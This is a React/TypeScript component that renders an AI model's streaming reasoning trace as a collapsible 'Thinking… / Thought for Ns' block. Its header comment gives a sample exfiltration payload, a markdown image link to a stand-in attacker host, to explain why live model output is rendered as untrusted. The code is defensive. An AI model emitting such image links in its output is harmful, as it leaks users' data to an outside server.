// The TTFT reasoning affordance — the ghost row's "Thinking… Ns" -> "Thought for Ns" disclosure (UI-Arch
// §6.3.1 layer 3 companion; scout "Streaming" section — neo's reasoning-block.tsx is ported as a
// DECISION, not code). While the live turn has reasoning tokens but no ANSWER token yet, the block is
// force-open with a ticking "Thinking… Ns" label; the instant the first answer token lands it
// auto-collapses to the frozen "Thought for Ns" duration. A user click on the trigger sets a PERMANENT
// override for this row — the auto force-open/collapse never fights a manual toggle again.
//
// DETERMINISM (UI-Gates client-determinism, PARKED gate — render scope bans Date.now/new
// Date/Math.random): the elapsed count is a plain tick COUNTER, never a wall-clock read. One
// `setInterval` increments it by 1 every second while `thinking` is true; the effect's cleanup (fired
// when `thinking` flips false, or on unmount) stops the ticking — which is exactly what "freezes" the
// duration for the "Thought for Ns" label, no separate frozen-at capture needed, the counter simply
// stops advancing. A CT test drives this deterministically with Playwright's `page.clock` (fakes the
// browser's timers) — the component itself takes no clock/now dependency to inject.
//
// The reasoning trace rides the SAME tokens -> useSmoothText -> Streamdown pipeline as the answer body
// (§6.3.1) and is passed through `repairStreamingTail` before it reaches Streamdown while still
// thinking (UI-Gates §11.6 the #402/#473 guards — a still-growing reasoning trace can contain an
// unterminated code fence or an unpaired emphasis marker exactly like the answer body can). Once
// thinking ends the trace is settled (no more reasoning deltas expected), so it renders as-is, same as
// the answer body gates its own repair pass on `streaming`.
//
// STREAM CONTENT IS UNTRUSTED (D44 §12.0 as corrected #25, UI-Gates §11.6): the reasoning trace is LIVE
// model output on the streaming path, so it renders `untrusted` for the same reason the ghost answer
// body does — a mid-stream `![](https://attacker/?d=…)` would exfiltrate before commit-time
// sanitization. The trace is pre-passed through `speakerTagsToPlain` (like the ghost body) so a
// complete `<speaker>` marker degrades to a plain `Name:` prefix instead of being dropped element+child
// by the untrusted allowlist.

import { holdTornSpeaker } from "@orb/kit/fix-markdown";
import { speakerTagsToPlain } from "@orb/kit/speaker-label";
import { Collapsible, CollapsiblePanel, CollapsibleTrigger } from "@orb/ui/collapsible";
// biome-ignore lint/correctness/noUnresolvedImports: biome can't follow @orb/ui/icons' re-export of the lucide-react glyphs (external .d.ts); tsc resolves the barrel (same class as react's Suspense in query-boundary.tsx).
import { BrainCircuit, ChevronDown, ChevronRight, Icon } from "@orb/ui/icons";
import { Row } from "@orb/ui/layout";
import { Markdown } from "@orb/ui/markdown";
import { StreamShimmer, useSmoothText } from "@orb/ui/stream";
import { Text } from "@orb/ui/text";
import type { ReactElement } from "react";
import { useEffect, useState } from "react";

const TICK_MS = 1000;
/** The reasoning trace's pacer floor — the header's ticking count already reads as "live"; the body
 *  just needs to avoid a hard jump when a chunk lands. */
const REASONING_CPS = 40;

export interface ReasoningBlockProps {
  /** The live/settled reasoning delta stream (raw — repaired + paced inside). */
  readonly reasoning: string;
  /** True while the turn has reasoning but no answer token yet (the TTFT window). Flips false the
   *  instant the first answer token lands — the auto-collapse trigger. */
  readonly thinking: boolean;
  /** Phase 4b §B.5.5 appearance.showLLMReasoningIcon — a quiet metadata-chip-style glyph beside the
   *  ticking label (mirrors `MessageMetadataRow`'s icon+chip pattern). Default off (quiet chrome). */
  readonly showIcon?: boolean | undefined;
}

/** The TTFT reasoning disclosure: force-open + ticking while thinking, auto-collapsed once the answer
 *  starts, permanently toggle-able by the user from then on. */
export function ReasoningBlock({
  reasoning,
  thinking,
  showIcon = false,
}: ReasoningBlockProps): ReactElement {
  const [elapsedSeconds, setElapsedSeconds] = useState(0);
  // `null` = no manual toggle yet (follow the auto thinking/thought rule); once the user clicks the
  // trigger this pins to their choice for the rest of this row's life (the "permanent override").
  const [override, setOverride] = useState<boolean | null>(null);

  useEffect(() => {
    if (!thinking) {
      return;
    }
    const id = setInterval(() => setElapsedSeconds((seconds) => seconds + 1), TICK_MS);
    return (): void => clearInterval(id);
  }, [thinking]);

  const expanded = override ?? thinking;
  const label = thinking ? `Thinking… ${elapsedSeconds}s` : `Thought for ${elapsedSeconds}s`;
  const paced = useSmoothText(reasoning, { enabled: thinking, cps: REASONING_CPS });
  // #38: Streamdown 2.5 repairs the streaming tail itself (mode="streaming"); only the torn-`<speaker>`
  // hold-back remains unique to us. Applies while thinking; settled traces render as-is. `speakerTagsToPlain`
  // then flattens any complete `<speaker>` marker to `Name:` (the untrusted seal drops the tag+child — head).
  const held = speakerTagsToPlain(thinking ? holdTornSpeaker(paced) : paced);

  return (
    <Collapsible open={expanded} onOpenChange={(next): void => setOverride(next)}>
      <CollapsibleTrigger>
        <Row gap="field" align="center">
          <Icon icon={expanded ? ChevronDown : ChevronRight} size="sm" />
          {/* Phase 4b §B.5.5 showLLMReasoningIcon — a quiet glyph naming the block as reasoning,
              mirroring MessageMetadataRow's icon-leads-label chip shape (never a full Badge here —
              this rides the collapsible trigger's own row, not a separate metadata chip strip). */}
          {/* Decorative (no `label`) — the adjacent "Thinking…"/"Thought for Ns" text already names
              the disclosure; a labelled icon here would double-announce it to assistive tech. */}
          {showIcon ? <Icon icon={BrainCircuit} size="sm" /> : null}
          <Text size="label" tone="muted">
            {label}
          </Text>
        </Row>
      </CollapsibleTrigger>
      <CollapsiblePanel>
        {held.length === 0 ? (
          <StreamShimmer label="Reading the reasoning trace…" />
        ) : (
          <Markdown trust="untrusted" mode={thinking ? "streaming" : "static"}>
            {held}
          </Markdown>
        )}
      </CollapsiblePanel>
    </Collapsible>
  );
}
